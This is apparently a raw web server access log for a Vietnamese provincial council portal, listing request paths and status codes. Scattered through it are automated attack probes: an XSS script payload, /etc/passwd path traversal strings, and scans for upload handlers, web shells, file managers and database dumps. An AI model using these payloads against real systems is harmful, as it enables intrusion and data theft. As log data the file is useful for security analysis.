/hoidongnhandan/1231/29459/39541/Nghien-cuu---Trao-doi/AttachFiles/AttachFiles/31.+NQ+sua+doi+bo+sung+NQ+11+_+62+HDND131220180426.pdf,404
/audio/27712.mp3,404
/server/,404
/_layouts/cui.js,200
/portal/pages/Ban-Van-hoa-Xa-hoi.aspx,200
/hoidongnhandan/1231/29459/39407/Gioi-thieu/AttachFiles/tai-lieu-detail.aspx,404
/portal/pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/v.aspx,400
/cgi-bin/nightled.cgi,404
/portal/_pageLayouts/two-cols-left/layout.css,200
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-regular.woff2,200
"/AttachFiles/38.+BC+phong,+chong+tham+nhung+6+thang+dau+nam+2019100620201049.pdf",200
/portal/Photos/2023-05-12/390c0af803f0778d20230511_152751.jpg,200
/audio/27981.mp3,404
/portal/LinkImage/2c8d9318ee102ddunnamed.jpg,200
/apple-touch-icon.png,404
/portal/Pages/default.aspx/test.ashx,200
"/redirect.php/""><script>alert(document.domain)</script>",400
/GallerySite/filesrc/fotoilan/388/middle/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd,400
"/AttachFiles/39.+BC+k.qua+thuc+hanh+tiet+kiem,+CLP+6+thang+dau+nam+2019100620201050.pdf",200
/portal/pages/photos,302
/Admin/Access/Setup/Default.aspx,404
/cgi-bin/awstats/awredir.pl,415
/chosen.php,404
/portal/Pages/2023-4-19/Dong-chi-Pho-Bi-thu-Thuong-truc-Tinh-uy-tiep-xuc-c61hgxb.aspx,200
/AttachFiles/van-ban-kinh-te.aspx,403
/portal/Pages/default.aspx/api/uploadfile.ashx,200
/admin/ajax/pages.php,404
/img/layouts/sidebar-toggler.png,200
/assets/backend/elfinder/elfinder-cke.html,404
/api/v2/cmdb/system/admin,404
/portal/Pages/default.aspx/ceshi.ashx,200
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-italic.woff2,200
"/AttachFiles/33.+BC+k.qua+t.hien+k.nghi+cua+dai+bieu+HDND+tinh+tai+ky+6,7100620201047.pdf",200
/portal/Pages/Gioi-thieu-chung.aspx,200
/portal/Photos/2023-10/fcfedec2a4cd61ddqh1.png,200
/db_backup.sql,404
/portal/pages/Hoat-dong-cua-HDND-tinh.aspx,200
/hoidongnhandan/1231/29459/39475/hdnd-qua-cac-thoi-ky/href='/AttachFiles/tai-lieu.aspx,404
/index.asp,415
/view-doccument-13-BC-HDND-58.html,404
/portal/Photos/2024-03/59a4b336ca88b8dda1_20240307123759.jpg,200
/https:/hdnd.namdinh.gov.vn/portal/portal/pages/van-ban/default.aspx,400
/logfile,404
/Style+Library/en-US/Themable/Core+Styles/controls.css,404
/portal/_res/img/bg-patern-footer.png,200
/portal/Pages/2023-10-23/NANG-CAO-CHAT-LUONG-CONG-TAC-THAM-MUU-GIUP-VIEC-VAsivciz.aspx,200
/portal/Photos/2024-02/_t/6b6a7ce30fd9c71d1_20240220112335_jpg.jpg,200
/hoidongnhandan/1231/29459/40932/van-ban-tra-loi-y-kien---kien-nghi-cu-tri/tai-lieu-detail.aspx,404
/portal/LinkImage/1d81b253d19d58adDA7.jpg,200
/wizard/initialise.php,404
/portal/Photos/2023-01-19/99989deda392571dIMG_2384.jpg,200
/cgi-bin/popen.cgi,404
"/hoidongnhandan/1231/29459/42080/hoi-dong-nhan-dan-huyen-nam-truc/AttachFiles/AttachFiles/5.+NQ+ve+quyet+dinh+chu+truong+dau+tu+du+an+xay+dung+KDC+tap+trung+phia+Bac+thon+An+Loc+Thuong,+xa+Yen+Hong,+huyen+Y+Yen260420210411.pdf",400
/WebResource.axd,200
/cgi-bin/slogin/login.py,404
/api/v1/method.callAnon/sendForgotPasswordEmail,404
/portal/Pages/2023-5-12/Dai-hoi-Cong-doan-Van-phong-Doan-DBQH-va-HDND-tinhsm6bs9.aspx,200
/horde/admin/user.php,404
/portal/Pages/2024-3-27/Hoi-nghi-toan-quoc-tong-ket-cong-tac-HDND-cac-tinht9cojv.aspx,200
/configWizard/keyUpload.jsp,404
/_layouts/1033/init.js,200
/client/index.php,404
/AttachFiles/25.+QD+muc+ho+tro+kp+tu+NSNN+va+cac+khoan+dong+gop+dv+nguoi+tu+nguyen+cai+nghien+MT020720190208.pdf,404
/_LAYOUTS/TanDan/UploadControler.ashx,200
/portal/Photos/2023-04-21/8901b0cad1ca9ced3.jpg,200
/audio/28053.mp3,404
/hoidongnhandan/1231/29461/39412/95501/Tin-tuc---Hoat-dong/Hoi-nghi-lien-tich-thong-nhat-noi-dung-ky-hop-thu-nam-Hoi-dong-nhan-dan-tinh-khoa-XVIII.aspx,404
/admin/elfinder/elfinder-cke.html,404
/network_test.php,404
/audio/28081.mp3,404
/portal/Pages/2023-7-11/Ban-Van-hoa--Xa-hoi-HDND-tinh-tham-tra-truoc-ky-hor8ud8t.aspx,200
/api/2eGZrlspR5oJDSTECVv0dW1ZfMt,404
/portal/Pages/default.aspx/Admin/Uploadify,200
/portal/Photos/2023-12/fc3b9dee9dc9cf1d10+(2).jpg,200
/portal/Pages/default.aspx/tools/Uploadhandler.ashx,200
/audio/27461.mp3,404
/AttachFiles/CV+số+322+của+UBTVQH14+về+tham+khảo+lấy+fieu+tin+nhiệm+(1)181020180315150620200231.pdf,200
/hoidongnhandan/1231/29459/42083/Hoi-dong-nhan-dan-huyen-Hai-Hau/,404
/AttachFiles/nghi-quyet.aspx,403
/portal/Photos/2023-01/dd1af49d044c8efdIMG_2384.jpg,200
/elFinder/php/connector.minimal.php,404
/portal/Pages/Cac-ban-HDND-tinh.aspx,200
/portal/Pages/2023-9-2/Tuyen-ngon-doc-lap--ket-tinh-nhung-gia-tri-van-hoap3zcft.aspx,200
/2eGZrcYCuUDCgqedlgws7Nx4MGA.jsp,404
"/AttachFiles/38.+BC+cua+UBND+tinh+ve+ket+qua+thuc+hanh+tiet+kiem,+chong+lang+phi+nam+2020031220200927.pdf",304
/AttachFiles/21.+QH+chung+rang+dong280620180909.pdf,304
/linuxki/experimental/vis/kivis.php,404
/portal/Pages/default.aspx/Manage/Uploadhandler,200
/backup-mysql.sql,404
/portal/Pages/default.aspx/api/upfile.ashx,200
/portal/Pages/default.aspx/Admin/Uploadhandler,200
/portal/LinkImage/a4476add1fdc5eadChinhPhu-2.jpg,200
/portal/_res/img/tangtuongphan.png,200
/v1/2eGZrftKq4IatbQGC7INQDq1jpg.php,404
/audio/27934.mp3,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/v.aspx,400
/portal/Pages/default.aspx/tools/Uploadhandler/Uploadhandler.ashx,200
/AttachFiles/hd+tổ+chức+kỳ+họp+thường+lệ+hĐnd+huyện030620180639.doc,200
/js/form/layouts.custom.js,200
/_layouts/tandan.portal/weather/img/48/02d.png,200
/index_sso.php,404
/_layouts/tandan.portal/weather/img/128/10n.png,200
/js/form/jquery.ui.min.js,200
/hoidongnhandan/1231/29459/42080/hoi-dong-nhan-dan-huyen-nam-truc/tai-lieu-detail.aspx,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/portal/pages/van-ban/default.aspx,400
/admin/uploads.php,404
/portal/Photos/2024-01/_t/91e81f2d5c3ea6fd1_20240130182954_png.jpg,200
/van-ban-van-hoa.aspx,404
/hoidongnhandan/1231/29459/44416/Ky-hop-thu-nam/AttachFiles/nghi-quyet.aspx,404
/audio/27740.mp3,404
/portal/Pages/2022-10-28/Giam-sat-viec-thuc-hien-cac-chuong-trinh-tin-dung-73wamu.aspx,200
/hoidongnhandan/1231/29461/39414/79587/Ban-Van-hoa---Xa-hoi-HDND-tinh/Ban-Van-hoa---Xa-hoi-HDND-tinh--tham-tra-De-an-dat--doi-ten-duong--pho-va-cong-trinh-cong-cong-TP-Nam-Dinh-Trinh-Ky-hop-thu-hai---HDND-tinh-khoa-XVIII--nhiem-ky-2016---2021.aspx,403
/js/layouts/app.js,200
/portal/Photos/2024-01/f960ed21dd670a7d1_20240119144606.png,200
/cgi-bin/masterCGI,404
/mysql_dump.sql,404
/dfsms/add-category.php,404
/portal/_res/img/bg-shadow.png,200
/portal/_themes/Portal_red/img/tags.png,200
/Style+Library/en-US/Core+Styles/page-layouts-21.css,404
/AttachFiles/qĐ+thành+lập+Đoàn+giam+sat+chuyen+de+ve+khcn1030620180631.doc,200
"/AttachFiles/18.+BC+k.qua+cong+tac+phong,+chong+toi+pham+va+vi+pham+PL+2019100620201110.pdf",304
/portal/pages/photos/default.aspx,200
/audio/27939.mp3,404
/hoidongnhandan/1231/29459/42080/hoi-dong-nhan-dan-huyen-nam-truc/AttachFiles/nghi-quyet-detail.aspx,404
/backups.sql,404
/portal/Photos/2023-12/bf654a61cd7d5dcd960_20231222221109.png,200
/portal/Pages/2024-3-14/HDND-tinh-to-chuc-ky-hop-giai-quyet-cong-viec-phat9euq2a.aspx,200
/portal/js/jquery.tandan.bar-chart.js,200
/mims/updatecustomer.php,404
/portal/Pages/2022-6-25/Doan-giam-sat-cua-Thuong-truc-HDND-tinh-hop-thong-9mu35z.aspx,200
/api/v1/login/oauth2/auth,404
/_layouts/spgridview.js,200
/export/mysql.sql,404
/portal/_res_bak/img/print.png,404
/audio/27559.mp3,404
/portal/Pages/default.aspx/api/fileupload.ashx,200
/portal/Pages/2021-9-30/Hoi-nghi-tong-ket-va-ky-ket-Quy-che-phoi-hop-cong-jbt3au.aspx,200
/SamlResponseServlet,404
/AttachFiles/05-NQ-HĐND100620201149.pdf,304
"/AttachFiles/NQ+54+phu+cap+Thon+doi+truong,+muc+tro+cap+ngay+cong+lao+dong+doi+voi+dan+quan+khi+thuc+hien+nhiem+vu151220200251.pdf",200
/AdminTools/querybuilder/logon,404
/portal/Pages/default.aspx/files.ashx,200
/portal/_themes/Portal_red/img/ic-search.png,200
/config/getuser,404
/portal/Pages/2023-12-10/feqb9q.aspx,200
/RestAPI/Connection,404
/flash/addcrypted2,404
/tai-lieu-detail.aspx,404
/js/form/jscrollpane.min.js,200
/wp-content/themes/wpclassic/inc/index.php,404
/portal/Photos/2023-05/_t/80b42ddfe5d2c0d11e2130191db4f8516ca_jpg.jpg,200
/portal/Photos/2024-03/_t/59a4b336ca88b8dda1_20240307123759_jpg.jpg,200
/portal/Photos/2023-06/6256a234de4e5c0duntitled-2_20230619143248.jpg,200
/portal/_res/img/ic-media-item.svg,200
/help/english/index.html,404
/portal/Photos/2023-09/73eac09334699e0da1_20230906182448.jpg,200
/sap/public/bc/ur/Login/assets/corbu/sap_logo.png,404
/wp-admin/dropdown.php,404
/x,404
/portal/Photos/2021-10-17/5a5fe1f7d1fc4a4ddtg.jpg,200
/_layouts/styles/dlgframe.css,200
/ads.txt,404
/CookieAuth.dll,404
/homeaction.php,404
/portal/Pages/2021-10-31/Doan-dai-bieu-Quoc-hoi-tinh-dong-gop-y-kien-tai-ca0vp588.aspx,200
/hms/user-login.php,404
/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php,404
/audio/27921.mp3,404
"/view-resol-Nghi-quyet-so-1-NQ-TTHDND-ngay-16-6-2016-ve-viec-xac-nhan-ket-qua-bau-cu-chu-tich-HDND-tinh-khoa-XVIII,-nhiem-vu-2016-2021-173.html",400
/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/servlets/OmaDsServlet,404
/hoidongnhandan/1231/29459/42085/Hoi-dong-nhan-dan-huyen-Giao-Thuy/AttachFiles/NQ+20+quyet+dinh+dieu+chinh+c.truong+dau+tu+DA+phat+trien+ha+tang+khung+CP+dien+tu+tinh+ND100620201154.pdf,404
/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/AttachFiles/thuong-truc.aspx,404
/wp-content/plugins/quiz-master-next/README.md,404
/AttachFiles/29.+Cac+BC+cua+Ban+Phap+che060620180941.pdf,200
/portal/Pages/default.aspx/api/Upload,200
/portal/Pages/2023-12-18/Ban-Thuong-vu-Tinh-uy-thao-luan-cho-y-kien-vao-cac8sjbqv.aspx,200
/css/form/jquery.tagsinput.css,200
/portal/VanBan/2023-04/cf21e26dd7f9fc8dThông+báo+kết+quả+kỳ+họp+thứ+10+HĐND+tỉnh.pdf,200
/AttachFiles/ban+pc.báo+cáo+thẩm+tra+(chính+thức)+(1)030620180636.doc,200
"/AttachFiles/23.+Đ.án+thu+phí+cấp+GCN+KD+cơ+sở,+CLB+về+thể+thao100620201138.pdf",200
/scripts/setup.php,404
/portal/Photos/2024-03-13/cfd864bb1d4874fdscreenshot-1710296531035.png,200
/van-phong-detail.aspx,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/console/login/LoginForm.jsp,404
/AttachFiles/23.+BC+cong+tac+nam+2019+cua+Cuc+thi+hanh+an+100620201112.pdf,200
/index.php,404
/hoidongnhandan/1231/29461/39412/95503/Tin-tuc---Hoat-dong/Hoi-nghi-Thuong-truc-HDND-cac-tinh--thanh-pho-Dong-bang-song-Hong-va-duyen-hai-Bac-Bo-tai-Ha-Noi.aspx,404
/backend/elfinder/elfinder-cke.html,404
/css/form/bootstrap.datepicker.css,200
/portal/admin/tai-nguyen/js/van-ban.js,200
/portal/Photos/2023-07/3faea2dd230b0fed357172196e3abd64e42b.jpg,200
/wp-admin/admin-post.php,404
"/site/thuvientailieudientuvietnam/AttachFiles/NQ+52+giao+bien+che+cong+chuc+QLHCNN+va+phe+duyet+tong+so+nguoi+lam+viec+trong+don+vi+SNCL,+to+chuc+hoi,+giao+vien+mam+non+HD151220200249.pdf",400
/audio/27842.mp3,404
/CTCWebService/CTCWebServiceBean/ConfigServlet,404
/AttachFiles/34.1.+BC+cua+UBND+tinh+ve+ket+qua+thuc+hien+sau+GSCD+cua+TT+HDND+tinh+ve+tinh+hinh+hoat+dong+cua+cong+ty+MTV+khai+thac+cong+trinh+thuy+loi031220200923.pdf,200
/STATE_ID/123/agentLogUploader,404
/apple-touch-icon-152x152-precomposed.png,404
/css/form/jquery.jgrowl.css,200
/portal/Pages/2022-11-21/Hoi-nghi-lan-thu-17-Ban-Chap-hanh-Dang-bo-tinh-kholeykot.aspx,200
/OASREST/v2/authenticate,404
/hoidongnhandan/1231/29459/40963/Chuong-trinh-hanh-dong-DB-HDND/AttachFiles/NQ+83+chap+thuan+dieu+chinh+thoi+gian+thuc+hien+du+an+xay+dung+kho+luu+tru+chuyen+dung+tinh151220200310.pdf,404
/portal/Pages/default.aspx/ceshi.asp,200
/ztp/cgi-bin/handler,404
/dms/admin/accounts/payment_history.php,404
/AttachFiles/NQ+80+chap+thuan+dieu+chinh+du+an+xay+dung+KDT+moi+phia+Nam+song+Dao151220200308.pdf,200
/xmlrpc,404
/wp-content/style.php,404
/AttachFiles/Báo+cáo+thẩm+tra+(chính+thức).doc130320180939.docx,304
/portal/pages/Tin-hoat-dong-HDND-cac-huyen-TP.aspx,200
/portal/Pages/2021-10-19/Giam-sat-viec-thuc-hien-chinh-sach-phap-luat-ve-trptz6ln.aspx,200
/wp-content/plugins/documentor-lite/core/js/documentor.js,404
/_layouts/tandan.portal/jslibs/jquery.js,200
/wp-includes/style.php,404
/admin.html,404
/portal/Pages/Ban-Phap-Che.aspx,200
/zimbraAdmin/0MVzAe6pgwe5go1D.jsp,404
/portal/LinkImage/ed4b073d7df5b2fdda+cam.jpg,200
/portal/Photos/2024-03/bac4b5956eafe91dqh_20240325212544.png,200
/portal/VanBan/2023-08/dbfbb64637e5f52dQuyết+định+triệu+tập+kỳ+họp+thứ+13+HĐND+tỉnh.pdf,200
/audio/27611.mp3,404
/portal/ImageAds/c7d149d0d51cdccdNghiQuyetDB.jpg,200
/api/graphql,404
/pme/media/,404
/_layouts/1033/core.js,200
/include/makecvs.php,404
/portal/js/font-zoom.js,200
/hoidongnhandan/1231/29461/39412/99593/Tin-tuc---Hoat-dong/Dang-huong-tuong-niem-111-nam-Ngay-sinh-Tong-Bi-thu-Truong-Chinh.aspx,404
/wp-content/themes/applica/400.php,404
/portal/Photos/2021-10-19/5d98965349446d1dvhxh1.jpg,200
/portal/Photos/2022-08-19/eeddedd3e45c260dimages1343578_Untitled_1.jpg,200
/webmail/,404
"/portal/VanBan/2021-11/2d283ae22207240d26.+Sap+xep,+sap+nhap+thon+(xom),+to+dan+pho+tren+dia+ban+tinh,+giai+doan+2021_2022.pdf",200
/portal/Pages/2023-8-25/Dau-an-nua-nhiem-ky-Hoi-dong-nhan-dan-cac-capccipc8.aspx,200
/portal/Pages/default.aspx/tools/Uploadhandler/Uploadify.ashx,200
/portal/pages/Tin-hoat-dong-Van-phong-Doan-DBQH-va-HDND.aspx,200
/wp-content/plugins/Cache/Cache.php,404
/AttachFiles/27.+BC+GSCD+cua+TT+HDND+tỉnh+ve+t.+hinh+h.dong+cua+cac+c.so+GDPTCL+tren+dia+ban+tinh100620201113.pdf,304
"/AttachFiles/4.+Sap+xep+don+vi+hanh+chinh+cap+huyen,+xã+giai+doan+2019-2021100620201100.pdf",206
/cgi-bin/export-cgi,404
/portal/Pages/2023-11-14/Dai-bieu-HDND-tinh-tiep-tuc-chuong-trinh-tiep-xuc-ncs8qk.aspx,200
/portal/admin/tai-nguyen/js/album.js,200
/portal/admin/default.aspx,200
/css/form/style.css,200
/ebook/bookPerPub.php,404
/portal/Photos/2023-12-25/12d7ea91528f3f0d2a.jpg,200
/card_scan.php,404
/audio/27926.mp3,404
/portal/Photos/2022-10-28/d419b4d68d61d4fdPXL_20221026_082107133.jpg,200
/portal/Photos/2022-11/79a3ed92da2316fdimages1345836_Untitled_1.jpg,200
/hoidongnhandan/1231/29459/39511/lich-cong-tac/tin-tuc-van-hoa.aspx,404
/wp-includes/js/tinymce/skins/lightgray/img/index.php,404
/_layouts/images/wpmenuarrow.png,200
/AttachFiles/kế+hoạch+giám+sát+chuyên+đề030620180608.doc,200
/portal/Photos/2022-06-30/8e0c0acbfd7189bdIMG_1656560362096_1656575143740.jpg,200
/portal/Pages/2023-8-22/Tuyen-duong-khen-thuong-con-CBCC-NLD-ve-thanh-tichdyk1i7.aspx,200
/portal/Pages/2021-3-25/Tao-dieu-kien-de-ung-cu-vien-lang-nghe-y-kien-cu-td2xfqc.aspx,200
/nghi-quyet-detail.aspx,404
/portal/_themes/Portal_red/jquery-ui/jquery-ui.min.css,200
/AttachFiles/nghị+quyết+24+của+TT+HĐND120620200831.pdf,200
/portal/VanBan/2021-12/86c6414a686418cd8.+60.+NQ+chap+thuan+du+an+phai+thu+hoi+dat+2020.pdf,200
/functionRouter,404
/hoidongnhandan/1231/29461/40932/80173/Van-ban-tra-loi-y-kien---kien-nghi-cu-tri/Bao-cao-so-164-BC-SNN-ngay-01-7-2016-cua-So-Nong-nghiep-va-Phat-trien-nong-thon-tra-loi-y-kien-kien-nghi-cua-cu-tri-tai-ky-hop-thu-16--HDND-tinh-khoa-XVII.aspx,403
/portal/LinkImage/bdd19138618d6dcdGopYVB-r.jpg,200
/_layouts/1033/styles/Themable/layouts.css,200
/portal/Photos/2024-03/a90d36d104e3d40d1_20240318180913.png,200
/db_dump.sql,404
/wp-content/uploads/cfom_files/2egzrb5ymxugydiur6jfpb9l56y.php,404
/wp-content/themes/universal-news/www.php,404
/portal/Pages/2023-10-12/Hoi-nghi-lan-thu-24-Ban-Chap-hanh-Dang-bo-tinh-khou5krs7.aspx,200
/portal/Photos/2024-01/_t/e46c3d0094bfd45d1_jpg.jpg,200
/geoserver/wms,404
/vendor/htmlawed/htmlawed/htmLawedTest.php,404
/js/jquery_file_upload/server/php/,404
/,302
/portal/Pages/Thuong-truc-HDND-tinh.aspx,200
/_layouts/tandan/img/no-avatar.jpg,200
/portal/pages/van-ban/https:/namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/audio/27879.mp3,404
/portal/_themes/Portal_red/img/chuoi.png,200
/_forms/default.aspx,200
/portal/VanBan/2021-11/28456a60436d222d34.2.+BC+ket+qua+giam+sat+chuyen+de+viec+t.hien+CSPL+ve+tro+giup+xã+hoi+tu+nam+2019+den+nay+(cua+Ban+VHXH).pdf,304
/Side.php,404
/portal/Pages/Doan-DBQH-tinh.aspx,200
/portal/Photos/2021-10-17/4a1a9626207f4dadbtk.jpg,200
/img/layouts/logo.png,200
/css/form/tandan.datatables.css,200
/portal/js/portal.app.js,200
/href='/tai-lieu-detail.aspx,404
/portal/_res/css/responsive.css,200
/hoidongnhandan/1231/29459/39471/so-do-site/ban-phap-che.aspx,404
/audio/27471.mp3,404
/AttachFiles/33.+BC+Ctác+ANTT+của+CA100620201140.pdf,304
/admin/dashboard.php,404
/_layouts/images/errorIcon.png,200
/van-ban-view.aspx,404
"/AttachFiles/30.+B.cao+phong,+chong+toi+pham+va+vi+pham+phap+luat+6+thang+dau+nam+cua+UBND+tinh140720210818.pdf",304
/portal/Pages/2021-10-13/Phong-Cong-tac-Hoi-dong-nhan-dan0h5603.aspx,200
/js/layouts/jquery-1.8.3.min.js,200
/jira/secure/BrowseProject.jspa,404
/alfa-rex.php7,404
/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php,404
/hoidongnhandan/1231/29459/39415/Ban-Phap-che-HDND-tinh/tai-lieu-detail.aspx,404
/AttachFiles/9.+Bao+cao+tham+tra+cua+Ban+KTNS220420210941.pdf,200
/actuator/gateway/routes/2eGZrkSZLx5hTKDyLRLIcyDsZ4b,302
/hoidongnhandan/1231/29459/39541/Nghien-cuu---Trao-doi/,404
"/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/AttachFiles/NQ+62+thong+qua+cap+nhat+thay+doi+ve+quy+mo,+dia+diem+va+so+luong+cong+trinh,+du+an+dat+quoc+phong+trong+dieu+chinh+QH+SDD151220200257.pdf",400
/AttachFiles/07.+NQ+muc+chi+va+thoi+gian+huong+ho+tro+phuc+vu+cong+tac+bai+cu+DBQH+va+DB+HDND+cac+cap+nhiem+ky+2021-2026220320211007.pdf,304
"/portal/VanBan/2024-03/4f070a03d7118e7dNghị+quyết+kỳ+họp+16+HĐND+tỉnh+khóa+XIX,+NK+2021-2026.rar",200
/portal/Photos/2023-01/37ae89186d3d23ddmt4.jpg,200
/src/redirect.php,404
/portal/Pages/2023-9-28/Doan-dai-bieu-Quoc-hoi-tinh-tiep-xuc-cu-tri-truoc-shazz3.aspx,200
/portal/_res/css/img/ic-title.png,200
/portal/Photos/2023-01-19/d13d4ec91cf0dacdIMG_2383.jpg,200
/meaweb/os/mxperson,404
/portal/images/icon.gif,200
/portal/Pages/2021-10-13/Lanh-dao-Van-phong-Doan-DBQH-va-HDND-tinh-Nam-Dinha10e1d.aspx,200
/audio/27494.mp3,404
/portal/Photos/2023-11/32d9051192338a6d1_20231125143917.jpg,200
/AttachFiles/NGHỊ+QUYẾT+28+CỦA+TT+HĐND120620200751.pdf,200
/portal/VanBan/2021-11/78840cf0add4f07d32.2.1.+Phu+luc+kem+theo+BC+GSCD+cua+Ban+KTNS+(PL+01).pdf,200
/wp-content/plugins/canto/includes/lib/get.php,404
/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/8-+NQ+76+ve+phi+thu+vien120620200950.doc,404
/api/scrape/kube-system,404
/checkValid,404
/_layouts/inplview.js,200
/js/form/bbq.js,200
/portal/Photos/2024-03-25/6ad777a1dd1d55ad3.jpg,200
/van-ban-thuong-truc.aspx,404
/assets/elFinder/elfinder.html,404
/dai-bieu-detail.aspx,404
/portal/Pages/default.aspx/Content/Uploadify,200
/AttachFiles/8.+BC+c.tac+nam+2018+cua+Cuc+THA011220181004.pdf,200
/portal/Photos/2023-05/a858a3cff78b889danh1_20230511175107.jpg,200
/portal/Pages/default.aspx/up.ashx,200
/portal/Photos/2023-02/dca5e5850d96807d1_20230221105815.png,200
/js/layouts/tandan.exporter.js,200
/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd#foo/development,400
/ajax/openvpn/del_ovpncfg.php,404
/public/formatter.jsp,404
/portal/_res/fonts/RobotoCondensed-Regular.ttf,200
/advanced_component_system/index.php,404
/wp-content/plugins/easy-wp-smtp/,404
/AttachFiles/BAO+CAO+tham+tra+trinh+tai+ky+hop+thu+4+cua+Ban+KT-NS+(chinh+thuc)+(1)130320180930.doc,200
/portal/Pages/2024-2-6/Van-hien-Nam-Dinh--Dong-rieng-giua-nguon-chung-zl5det.aspx,200
"/AttachFiles/NQ+37+nang+cap+ha+tang+vung+nuoi+trong+thuy+san+xa+Bach+Long,+h,+Giao+Thuy100620201159.pdf",200
/portal/Photos/2023-05/bac64f494c129d6d1a.jpg,200
/AttachFiles/3.+BC+ket+qua+GSCD+cua+TT+HDND+tinh051220180835.pdf,200
/accounts/login/,404
/tin-tuc-detail.aspx,404
"/AttachFiles/10.+Bao+cao+ket+qua+GSCD+cua+Thuong+truc+HDND+tinh+ve+su+dung+kinh+phi+tu+tien+su+dung+dat,+tien+thue+dat+co+cong+tac+do+dac,+d.ky+dat+dai031220200843.pdf",200
/searchblox/servlet/FileServlet,404
/portal/admin/tai-nguyen/van-ban.aspx,200
/plugin,404
/AttachFiles/28.2.+BC+GS+chuyen+de+ky+7+Ban+Phap+che011220181047.pdf,304
/css/form/TDForm.css,200
/portal/Pages/2021-10-13/8a7z6t.aspx,200
"/hoidongnhandan/1231/29459/40963/Chuong-trinh-hanh-dong-DB-HDND/AttachFiles/NQ+84+chap+thuan+dieu+chinh+d.an+xay+dung+KDT+thi+tran+My+Loc,+huyen+My+Loc151220200311.pdf",404
/portal/pages/Tin-tuc-su-kien.aspx,200
/portal/VanBan/2021-11/d2d94b42e360034d32.2.+BC+GSCĐ+thuc+hien+chuong+trinh+moi+xa+mot+san+pham+OCOP+cua+Ban+KTNS.pdf,200
/ext-js/index.html,404
/hoidongnhandan/1231/29459/39471/so-do-site/nghi-quyet-detail.aspx,404
/wp-login.php,404
/portal/Pages/default.aspx/Content/Uploadhandler,200
/AttachFiles/bc+kien+nghi+cu+tri+26-10030620180620.doc,200
/AttachFiles/1.+BC+nam+2018+cua+UBMTTQ+t_nh011220180625.pdf,200
/_layouts/tandan.portal/weather/img/128/03d.png,200
/tin-tuc-van-phong-detail.aspx,404
/ajaxPages/writeBrowseFilePathAjax.php,404
"/AttachFiles/19.+QĐ+mức+chi+công+tác+phí,+HN040620180828.pdf",200
/portal/_res/img/bg-title-2.png,200
/users/sign_in,404
/portal/Pages/default.aspx/api/files.ashx,200
/portal/Photos/2024-03-25/906691df8612c55d1.jpg,200
/hoidongnhandan/1231/29459/42094/Tin-tuc---Su-kien/AttachFiles/7.+NQ+ve+chap+thuan+dieu+chinh+thoi+gian+thuc+hien+cac+du+an+dau+tu+cong260420210411.pdf,404
/portal/Pages/Dai-bieu-HDND-tinh.aspx,200
/OA_HTML/BneViewerXMLService,404
/api/settings/values,404
/awstats/awredir.pl,415
/wp-admin/admin.php,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/_forms/td-login.aspx,400
/AttachFiles/Quy%E1%BA%BFt%20%C4%91%E1%BB%8Bnh%20tri%E1%BB%87u%20t%E1%BA%ADp%20k%E1%BB%B3%20h%E1%BB%8Dp%20th%E1%BB%A9%2012-k%E1%BB%B3%20h%E1%BB%8Dp%20b%E1%BA%A5t%20th%C6%B0%E1%BB%9Dng191220190312.pdf,400
/portal/Pages/default.aspx/files.asp,200
/portal/Pages/default.aspx/tools/Uploadify/Uploadify.ashx,200
/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php,404
/portal/ImageAds/8d03f4fa9d04470dxanh+com+999.jpg,200
/assets/data/usrimg/2ecvi8bn9bwky9ugwyeugaloge0.php,404
/session/create,404
/catalog-portal/ui/oauth/verify,404
/sap/admin/public/default.html,404
/assets/php/profile.php,404
/assets/elFinder-2.1.9/elfinder.html,404
/portal/pages/van-phong-doan-DBQH-HDND-tinh.aspx,200
/mgmt/tm/util/bash,404
/portal/Pages/2023-1-11/Hoi-nghi-gap-mat-can-bo-huu-tri-co-quan-Van-phong-bxbkgy.aspx,200
/js/form/jquery.fancybox.js,200
/portal/Pages/2024-3-13/HDND-tinh-to-chuc-ky-hop-giai-quyet-cong-viec-phatjwtq6b.aspx,404
/api/content/,404
/portal/Pages/default.aspx/api/uploadify.ashx,200
/js/form/bootstrap.min.js,200
/_layouts/TANDAN.Webservice.asmx,200
/repeater.php,404
/AttachFiles/10.+Báo+cáo+của+Công+An+tỉnh+năm+2017040620180821.pdf,304
/css/form/jquery.idtabs.css,200
/portal/Pages/default.aspx/file.ashx,200
/portal/Pages/2021-12-15/Dai-bieu-Quoc-hoi-tinh-to-chuc-giam-sat-chuyen-de-otujn5.aspx,200
/portal/Photos/2023-05-12/153737d1bd2b1dbd2.jpg,200
"/AttachFiles/4.+BC+cong+tac+MT,+xay+dung+chinh+quyen+nam+2019+của+MTTQ+tinh100620201107.pdf",304
/banker/index.php,404
/ScriptResource.axd,200
/portal/Photos/2024-03/_w/bac4b5956eafe91dqh_20240325212544_png.jpg,200
/apple-touch-icon-152x152.png,404
/AttachFiles/10.+BC+thực+hiện+KNg+sau+GSCĐ+về+DT+tuyến+đg+bộ+NĐ-P.lý130620180420.pdf,200
/ccms/index.php,404
/audio/27113.mp3,404
/portal/Photos/2024-01/91e81f2d5c3ea6fd1_20240130182954.png,200
/sap/bc/BSp/sap/menu/fameset.htm,404
/cgi-bin/kerbynet,404
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-700.woff2,200
/css/layouts/bootstrap.min.css,200
/AttachFiles/15.2.+QH+b.ton+d.dang+sinh+hoc+tinh+ND+(đủ)011220181011.pdf,200
/portal/Pages/default.aspx/test.asp,200
